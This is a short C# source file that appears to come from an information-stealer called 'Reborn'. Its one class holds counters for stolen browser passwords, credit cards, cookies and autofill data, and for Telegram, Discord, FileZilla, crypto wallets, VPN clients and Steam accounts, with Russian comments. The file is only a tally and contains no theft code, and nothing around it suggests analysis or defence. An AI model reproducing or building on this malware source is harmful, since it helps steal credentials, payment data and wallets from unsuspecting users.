﻿namespace Reborn
{
    class Counting
    {
        // Браузер
        public static int Passwords = 0;
        public static int CreditCards = 0;
        public static int AutoFill = 0;
        public static int Cookies = 0;
        public static int History = 0;
        public static int Bookmarks = 0;
        public static int Downloads = 0;

        // Параша
        public static int Telegram = 0;
        public static int Discord = 0;
        public static int VimeWorld = 0;
        public static int FileZilla = 0;
        public static int FileGrabber = 0;
        public static int Wallets = 0;
        public static int NordVPN = 0;
        public static int OpenVPN = 0;
        public static int ProtonVPN = 0;
        public static int Steam = 0;
    }
}
